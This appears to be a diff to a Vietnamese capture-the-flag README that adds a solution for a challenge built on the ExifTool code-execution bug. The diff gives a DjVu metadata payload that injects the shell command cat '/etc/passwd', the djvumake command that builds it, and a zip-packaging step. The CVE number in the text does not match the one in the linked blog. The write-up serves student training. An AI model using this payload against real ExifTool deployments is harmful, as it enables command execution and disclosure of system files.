@@ -37,7 +37,26 @@ Biêt được đây là CVE-2021-22004 và người cho chơi thể tìm kiếm
  Giúp các bạn sinh viên có thể tìm ra được blog của author (https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html).
  Ở blog giúp các bạn sinh viên hiểu rõ về bug và các tạo mã khai thác dưới định dạng jpeg. Các bạn cần nắm vững kiên thức ở quy trình tạo payload jpeg, từ đó chỉ cần một số bước nhỏ có thể tạo payload ở dạng ZIP ( cuối blog tác giả cũng đã giải thích cho các tạo payload ở định dạng zip nhưng không có mì ăn liền, vì vậy có làm mới có ăn.)
  
- 
+## Cách giải
+
+1. Tạo payload Djvu bắng Djvumake ( payload có sẵn trong blog nhưng các tạo thì các bạn sinh viên cũng phải tự research)
+
+Tạo file payload.txt với nội dụng:
+```
+(metadata
+    (Author "\
+" . cat '/etc/passwd'; #")
+)
+```
+
+Sử dụng Djvumake để tạo payload dạng Djvu
+```
+djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=payload.txt
+```
+
+2. Tạo payload dạng .zip bằng các đổi tên `exploit.djvu` thành `meta.json` và nén lại.
+
+
 ## Install
 
 Clone project...
